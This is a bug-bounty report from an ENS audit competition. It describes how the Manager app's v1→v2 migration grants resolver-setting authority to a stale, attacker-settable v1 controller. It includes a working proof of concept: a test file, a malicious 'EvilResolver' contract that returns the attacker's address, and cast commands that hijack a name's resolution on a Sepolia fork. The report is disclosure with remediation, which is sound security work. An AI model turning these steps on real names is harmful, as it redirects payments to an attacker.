# 89744 w a critical v1 v2 migration unconditionally grants role set resolver on the v2 ethregistry to the name s stale v1 registry controller an attacker settable address the manager never displ&#x20;

## #89744 \[W\&A-Critical] v1→v2 migration unconditionally grants ROLE\_SET\_RESOLVER on the v2 ETHRegistry to the name's stale v1 registry controller — an attacker-settable address the Manager never displ...

**Submitted on Aug 20th 2026 at 21:54:45 UTC by @Kio77583 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89744
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

### Description

Severity: Critical Target asset: apps/manager (the grant is built and dispatched by apps/manager's migration service; the classifier it calls lives in packages/migration, which apps/manager re-exports and ships). Commit: audit-comp-ready @ 1c9b47f18fcddd2e864dfe385c4171061c9811ae.

Summary

When a v1 .eth name's ENS Registry controller (domain.owner in the v1 subgraph) differs from its BaseRegistrar registrant (domain.registrant), the v1→v2 migration silently turns that controller into a standing v2 role holder: it emits ETHRegistry.grantRoles(resource, ROLE\_SET\_RESOLVER, account) (resource = the migrated name, account = the stale controller) as part of the atomic migration batch, with no opt-out and no on-screen disclosure of the address.

Controller ≠ registrant is not an exotic state. It is the normal outcome of any v1 name that changed hands without the new registrant calling BaseRegistrar.reclaim() — every marketplace sale, OTC transfer, or delegated-manager setup. In v1 that state is harmless: the registrant can overwrite the controller at any time with one reclaim() call. The migration takes that revocable, visible v1 state and re-issues it as a v2 role — invisible in the Manager, and pointing at whoever the seller left as controller.

Root cause (all in-scope TypeScript — code shown inline)

1. The classifier derives managerAddress from the v1 registry controller. packages/migration/src/service/classifyNames.ts:162-167:

const registryOwnerAddress = toAddress(domain.owner.id) const managerAddress: Address | null = registryOwnerAddress && registryOwnerAddress.toLowerCase() !== registrant.id.toLowerCase() ? registryOwnerAddress : null

domain.owner is the ENS Registry owner (the "manager"/controller in ENS's own UI vocabulary); domain.registrant is the BaseRegistrar ERC-721 holder — the person actually performing the migration. Any divergence populates managerAddress.

2. The grant is built unconditionally from that address. apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:11-27:

export const buildRoleGrantCall = (name: ClassifiedName): Call => { if (!name.managerAddress) { throw new Error(`No manager address for ${name.domain.name}`) } const resource = labelToCanonicalId(name.label) return { to: V2\_CONTRACTS.ETHRegistry, data: encodeFunctionData({ abi: ETH\_REGISTRY\_V2\_ABI, functionName: 'grantRoles', args: \[resource, ROLE\_SET\_RESOLVER, name.managerAddress], // ROLE\_SET\_RESOLVER = 1n << 24n }), value: 0n, } }

3. It is wired into the atomic batch with no opt-out, and the batch asserts it succeeded. apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:608-625:

if (classified.managerAddress) { innerExecutions.push({ phase: 'manager-role-grant', name, names: \[name], call: buildRoleGrantCall(classified), }) verificationExpectations.push({ id: expectationId(name, 'manager-role'), type: 'manager-role', name, registry: V2\_CONTRACTS.ETHRegistry, resource: labelToCanonicalId(classified.label), account: classified.managerAddress, roleBitmap: ROLE\_SET\_RESOLVER, }) }

There is no toggle, no per-name choice, and no branch that skips it. The migration verifier then requires the grant to have landed, so the user cannot even complete a migration without it.

4. The user is never told which address receives it. The only surface the migrating user sees is a generic approval step — apps/manager/src/features/migration/components/WalletConfirmationStepsDialog.tsx:81-89 renders "Approve manager restoration — Restore the existing managers for your names.", and the in-flight description (migrationService.ts:334) is "Allowing your HCA to restore managers". Neither names the address, the name it applies to, nor the authority being handed over. Searching apps/manager/src for managerAddress across every .tsx returns zero hits outside a test fixture — the value never reaches a component.
5. The Manager cannot show or revoke v2 roles at all. Searching every .tsx file under apps/manager/src for grantRoles / revokeRoles / ROLE\_SET\_RESOLVER returns zero matches. Role inspection and revocation live only in apps/portal (apps/portal/src/features/roles). A user who migrates in the Manager — the app that owns the migration flow — has no path in that app to discover the grant or undo it.

Why this is not a faithful port of v1 semantics

The code frames the grant as "restoring the existing managers", but the two states differ where it matters:

Removing it: in v1 the token owner erases the controller with one BaseRegistrar.reclaim(tokenId, self) (surfaced in ENS's own UI as "Set as controller"). After migration there is no equivalent in the Manager; it requires the Portal roles UI or a raw contract call. Surviving a sale: the v1 controller only lasts until the buyer calls reclaim(). The migration re-issues it as a role that persists past the sale. Disclosure: v1 UIs show the controller field. The migration grant is shown nowhere.

So the migration does not preserve authority; it converts a revocable, visible v1 artifact into a standing, undisclosed v2 role.

Attack

The precondition is attacker-settable, which is what makes this more than a footgun:

Attacker owns prize.eth on v1. Before selling, they call Registry.setOwner(namehash('prize.eth'), attackerSecondAddress) — a normal, free v1 operation that leaves the name fully functional and looks unremarkable on a listing. Attacker sells / transfers the ERC-721 to the victim (marketplace, OTC, direct transfer). The victim is now the registrant; the registry controller is still attackerSecondAddress. The victim migrates prize.eth to v2 through the Manager — the app's flagship, actively promoted flow. They see "Approve manager restoration". No address, no warning. The atomic batch executes grantRoles(prize, ROLE\_SET\_RESOLVER, attackerSecondAddress) on the v2 ETHRegistry. At any later time the attacker calls ETHRegistry.setResolver(prize, attackerResolver). prize.eth now resolves through a contract the attacker controls — every addr, text, and contenthash lookup returns whatever they choose.

A passive variant needs no attacker preparation at all: any user who bought a v1 name and never called reclaim() hands their seller this role by migrating.

Impact

Direct match to the program's Critical categories:

"Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker"

"Causing the application to display or pre-fill an incorrect address … such as: resolving or rendering an ENS name to an attacker-controlled address"

Any wallet or application resolving the affected name — not only ENS's own apps — receives the attacker-substituted address, so a user paying to the name sends funds to the attacker. Funds sent during the hijack window are unrecoverable: they leave the victim's control the moment resolution is trusted, and nothing the victim later does to the name reverses a transfer that already settled. text and contenthash are reachable through the same resolver, so the impact is not limited to payment addresses.

Additional consequence surfaced by the on-chain run (POC step 4): each setResolver the attacker performs bumps the name's ERC-1155 token-id version and emits no TransferSingle. Any external system tracking the name by token id — a marketplace listing, an escrow, an NFT-collateral position — sees the token silently change identity, and the attacker can trigger that at will while they hold the role.

No elevated privileges and no uncommon user interaction are required: the victim performs exactly the flow the app asks them to perform.

Not a duplicate

Checked against the full published known-issues list. Nothing covers this root cause.

QA-01 / WEB-1257 concern role combinations that cause errors after a transfer. This is the opposite: nothing errors, and authority is granted. The program's own rule draws the line here: "a demonstrated security consequence of one of them (for example, a role combination that grants authority it should not, rather than merely erroring) goes beyond the known breakage and is a new finding." WEB-1249 (creating a subname can replace an existing child registry) and WEB-716 (registry page won't offer to replace an existing subregistry) are subregistry-slot issues, not role grants during migration. WEB-806 / WEB-390 are about subnames missing from migration lists/profiles. No R2-/R3-/EXP-/SEC-MGR-/SEC-TXM- entry touches migration role grants. Remediation Do not grant v2 roles derived from stale v1 registry state by default. The registrant is the party migrating; the controller is a v1 artifact the registrant could already have erased for free. If manager restoration is kept, make it explicit and per-name: show the address that will receive the role, which name it applies to, and what it grants, with an opt-out defaulting to off. Ship a roles view (and revoke action) in apps/manager, or at minimum link the migrating user to the Portal roles page for each name that received a grant. Re-read the controller on-chain at migration time instead of trusting the subgraph snapshot — a reclaim() performed shortly before migration is not reflected today, so a controller the user has already removed can still be granted the role.

### Proof of Concept

Two independent halves. The exact source and the exact output are shown inline below — everything needed to verify the finding is in this report.

PART A — the Manager builds the malicious grant (pure TypeScript, no chain)

This calls the shipped classifyName and buildRoleGrantCall with the exact v1-subgraph shape of a name sold without reclaim() (Registry controller = attacker, registrant = victim), then decodes the calldata the Manager would submit. Full test source:

import { type Address, decodeFunctionData } from 'viem' import { describe, expect, it } from 'vitest' import { classifyName } from '@ens-apps/migration' import type { V1Domain } from '@ens-apps/migration' import { ETH\_REGISTRY\_V2\_ABI } from '../contracts/abis' import { V2\_CONTRACTS } from '../contracts/addresses' import { buildRoleGrantCall } from './buildRoleGrantCalls'

const VICTIM: Address = '0x1111111111111111111111111111111111111111' // registrant (NFT owner / migrator) const ATTACKER: Address = '0xdead00000000000000000000000000000000beef' // stale v1 registry controller

// Exactly the shape the v1 subgraph returns for an unwrapped .eth 2LD that was // sold/transferred without the buyer calling BaseRegistrar.reclaim(). const soldName: V1Domain = { id: '0xabc', labelName: 'prize', labelhash: '0xdef', name: 'prize.eth', resolver: null, owner: { id: ATTACKER }, // v1 ENS Registry controller — still the seller registrant: { id: VICTIM }, // BaseRegistrar ERC-721 owner — the buyer wrappedOwner: null, parent: { name: 'eth', wrappedDomain: null }, registration: { expiryDate: String(Math.floor(Date.now() / 1000) + 365 \* 24 \* 3600) }, wrappedDomain: null, }

describe('PoC: migration restores a stale v1 controller as a v2 role holder', () => { it('classifies the seller as managerAddress and emits grantRoles to them', () => { const result = classifyName(soldName, VICTIM) expect(result?.type).toBe('classified') if (result?.type !== 'classified') throw new Error('unreachable')

```
// 1. The stale v1 controller is picked up as `managerAddress`.
expect(result.name.managerAddress?.toLowerCase()).toBe(ATTACKER.toLowerCase())

// 2. That address is granted ROLE_SET_RESOLVER on the v2 registry.
const call = buildRoleGrantCall(result.name)
const { functionName, args } = decodeFunctionData({ abi: ETH_REGISTRY_V2_ABI, data: call.data })
const [ , roles, account ] = args as [bigint, bigint, Address]

expect(call.to).toBe(V2_CONTRACTS.ETHRegistry)
expect(functionName).toBe('grantRoles')
expect(roles).toBe(1n << 24n)                                  // ROLE_SET_RESOLVER
expect(account.toLowerCase()).toBe(ATTACKER.toLowerCase())     // grantee == attacker
```

}) })

Run (drop the file into apps/manager/src/features/migration/service/):

pnpm install cd apps/manager && npx vitest run src/features/migration/service/.test.ts

Actual output — the decoded calldata the Manager builds:

victim (registrant / migrator): 0x1111111111111111111111111111111111111111 attacker (stale v1 controller): 0xdead00000000000000000000000000000000beef classified.managerAddress : 0xdead00000000000000000000000000000000beef call.to (v2 ETHRegistry) : 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2 function : grantRoles roleBitmap : 16777216 = 1n<<24n (ROLE\_SET\_RESOLVER) grantee : 0xDeaD00000000000000000000000000000000BEEf <- the attacker

Test Files 1 passed (1) PART B — that calldata really hands the name over (real deployed Sepolia contracts)

Run on an Anvil fork of Sepolia against the real deployed bytecode — no mocks except the attacker's own resolver (source below):

ETHRegistry (v2) 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2 ETHRegistrar 0xa88553F454b77203B0D036A05c894d555EAAa2Cc PublicResolverV2 0xe7B9A25607E02da8145E4eB1836CA539e53F11f7 (the legitimate resolver)

Attacker's resolver (every lookup returns the attacker):

// SPDX-License-Identifier: MIT pragma solidity ^0.8.20; contract EvilResolver { address public immutable attacker; constructor(address a) { attacker = a; } function supportsInterface(bytes4) external pure returns (bool) { return true; } function addr(bytes32) external view returns (address) { return attacker; } function addr(bytes32, uint256) external view returns (bytes memory) { return abi.encodePacked(attacker); } function text(bytes32, string calldata) external pure returns (string memory) { return "attacker-controlled"; } function resolve(bytes calldata, bytes calldata) external view returns (bytes memory) { return abi.encode(attacker); } fallback() external { address a = attacker; assembly { mstore(0, a) return(0, 32) } } }

The crux is two calls (setup — funding, commit/reveal registration with the legitimate resolver — is ordinary and omitted for brevity; VIC = victim key, ATT = attacker key, TID = the name's role resource / token id):

## STEP 3 — the victim migrates. This is the Manager's own grantRoles calldata,

## byte for byte, sent by the victim to the v2 ETHRegistry:

cast send $REG\
0x7c3005860000000000000000000000000000000000000000000000000000000001000000\
\--private-key $VIC --rpc-url $RPC

## (0x7c300586 = grantRoles(uint256,uint256,address); 2nd word 0x…01000000 = 1<<24 = ROLE\_SET\_RESOLVER)

## STEP 4 — the attacker, who never owned this name, repoints its resolver:

cast send $REG "setResolver(uint256,address)" $TID $EVIL --private-key $ATT --rpc-url $RPC

Transcript from an independent run on the submitter's own machine (Windows 11 with WSL2, a different host from where this report was written, the runner's own Alchemy Sepolia RPC, fresh code-free actor addresses), fork block 11529846, m1poc19339.eth:

SETUP VICTIM (buyer/registrant) : 0x360Be36a36A9033bDBf7023c101405FeAE35Fc26 ATTACKER(stale v1 manager) : 0x3940D95e9bE5211957C0F71603b64AD701d32C96

STEP 1 — normal registration (victim, legitimate resolver) register tx : 0x4de6c406944d4236cb4b5d3482e6edf90f2e7abfcf73b07c1c397dc5d4163cd9 status=0x1 tokenId / role resource : 0x897b057789822b784df6084000fa026946bc00c88101e9a73aa4b43200000000 owner : 0x360Be36a36A9033bDBf7023c101405FeAE35Fc26 (victim) resolver : 0xe7B9A25607E02da8145E4eB1836CA539e53F11f7 (legitimate PublicResolverV2) attacker roles : 0 attacker hasRoles(SET\_RES) : false

STEP 2 — attacker deploys EvilResolver EvilResolver : 0x69cfeEAAa1EB2521eefFaa31F99D6cebde35b550

STEP 3 — victim migrates: the Manager's own grantRoles calldata, byte for byte calldata : 0x7c300586897b057789822b784df6084000fa026946bc00c88101e9a73aa4b432000000 00000000000000000000000000000000000000000000000000000001000000 00000000000000000000003940d95e9be5211957c0f71603b64ad701d32c96 grantRoles tx : 0x6df1c89b486914527dbc113034dd92046e69a6b2af5fe865935810b73d14f148 status=0x1 attacker roles : 16777216 (= 1<<24, ROLE\_SET\_RESOLVER) attacker hasRoles(SET\_RES) : true

STEP 4 — attacker (never owned the name) repoints resolution setResolver tx (from ATT) : 0xb1f7587ecb20a68a2c56bc06394b066d254734f7686e83977ccd2095af36c0ee status=0x1 resolver now : 0x69cfeEAAa1EB2521eefFaa31F99D6cebde35b550 (EvilResolver) node : 0x6fabf2355882771062ed44070287f664a11b3d62ab25a975917f09a93fb37f40 EvilResolver.addr(node) : 0x3940D95e9bE5211957C0F71603b64AD701d32C96 (the attacker) registry owner (getState) : 0x360be36a36a9033bdbf7023c101405feae35fc26 (victim still owns the name)

The victim owns the name throughout; what changed is what the name resolves to. An earlier run against a public RPC on a separate host produced the identical pattern (register / deploy / grant / hijack, all status=0x1), so the result is a property of the deployed contracts, not of one machine or RPC.
